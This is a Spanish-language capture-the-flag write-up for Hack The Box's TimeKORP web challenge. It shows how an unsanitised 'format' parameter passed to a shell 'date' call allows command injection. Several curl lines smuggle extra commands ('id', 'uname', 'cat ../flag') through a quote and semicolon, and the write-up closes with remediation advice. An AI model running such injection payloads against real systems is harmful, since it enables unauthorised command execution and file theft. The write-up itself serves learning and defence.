---
title: "TimeKORP"
description: "Writeup de TimeKORP - Hack The Box - Web 100pts. Aplicación Python que pasa el parámetro 'format' directamente al comando date del sistema; inyección con comilla simple permite ejecutar comandos adicionales y leer la flag."
sidebar:
  badge:
    text: Web
    variant: note
tags:
  - htb
  - web
  - command-injection
  - python
  - werkzeug
  - rce
  - date
  - shell-injection
---

# TimeKORP

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Web
> 🏆 Puntos: 100
> 👤 Autor: warrior866

---

## Descripción

**TimeKORP** es una aplicación web sencilla que muestra la hora/fecha actual usando el comando `date` del sistema operativo. El parámetro `format` de la URL se pasa directamente al comando `date +FORMAT` sin ninguna validación ni sanitización. Al inyectar una comilla simple, se puede cerrar el string del formato y añadir comandos adicionales que el servidor ejecutará como parte del mismo proceso shell.

---

## Reconocimiento

```bash
nmap -sSCV $IP -p $PORT
# nginx, Title[Time]
# Author: makelaris, makelarisjr (meta)
```

La aplicación tiene dos botones: "What's the time?" y "What's the date?", que corresponden a:

```
GET /?format=%H:%M:%S   → muestra hora actual
GET /?format=%Y-%m-%d   → muestra fecha actual
```

El servidor ejecuta internamente algo equivalente a:

```python
import subprocess
result = subprocess.check_output(f"date +'{format_param}'", shell=True)
```

donde `format_param` proviene directamente del query string sin escapar.

---

## Detección de command injection

Al probar con comilla simple y un comando simple como `id`:

```bash
curl -X GET "http://$HOST/?format=%H:%M:%S';id'"
```

La respuesta incluye la salida de `id`:

```html
<h1 class="jumbotron-heading">
  ><span class='text-muted'>It's</span> uid=1000(www) gid=1000(www) groups=1000(www)
  <span class='text-muted'>.</span>
</h1>
```

Confirmada la inyección. El servidor es un usuario `www` (uid=1000) sobre Linux.

---

## Verificación adicional

```bash
# Confirmar kernel
curl -G 'http://$HOST/' --data-urlencode "format=%H:%M:%S';uname -r'"
# Respuesta: 6.18.24-talos (o similar)

# Confirmar OS
curl -G 'http://$HOST/' --data-urlencode "format=%H:%M:%S';uname'"
# Respuesta: Linux
```

---

## Leer la flag

La flag está un directorio arriba del directorio de trabajo de la aplicación (`../flag`):

```bash
curl -G 'http://$HOST/' --data-urlencode "format=%H:%M:%S';cat ../flag'"
```

```html
<h1 class="jumbotron-heading">
  ><span class='text-muted'>It's</span> HTB{FLAG}
  <span class='text-muted'>.</span>
</h1>
```

**¿Por qué `../flag` y no `/flag`?** La aplicación corre desde un subdirectorio del servidor (p.ej. `/app/web/`), y el archivo de flag está en `/app/flag` o similar, por lo que `../flag` funciona relativamente.

---

## Cadena de Ataque

```text
1. GET /?format=%H:%M:%S → muestra hora → sabemos que usa date +FORMAT
       ↓
2. GET /?format=%H:%M:%S';id' → RCE confirmado → uid=1000(www)
       ↓
3. GET /?format=%H:%M:%S';cat ../flag' → flag en la respuesta HTML
```

La inyección funciona porque el servidor construye el comando:
```bash
date +'%H:%M:%S';cat ../flag'
```
El primer `'` cierra el string del formato, `;` separa comandos, y el `cat ../flag` se ejecuta como comando adicional.

---

## Lecciones Aprendidas

- **Nunca pasar parámetros de usuario directamente a `shell=True`**: en Python, `subprocess.check_output(f"date +'{param}'", shell=True)` es vulnerable. La solución es usar `subprocess.check_output(["date", f"+{param}"])` (lista de argumentos, sin shell=True) y validar que `param` solo contenga caracteres válidos para formato de `date`.
- **`shell=True` amplifica el riesgo**: cuando se usa `shell=True`, el intérprete de comandos procesa el string completo, lo que permite `;`, `|`, `&`, `$()` y otros metacaracteres de shell. Sin `shell=True`, el ejecutable recibe los argumentos directamente sin interpretación del shell.
- **Validación de formato**: en este caso, los caracteres válidos de formato de `date` son `%` seguido de una letra. Cualquier otro carácter (como `'`, `;`, `|`) debería ser rechazado.

---

## Referencias

- [HackTricks — Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
- [OWASP — OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Python docs — subprocess](https://docs.python.org/3/library/subprocess.html)
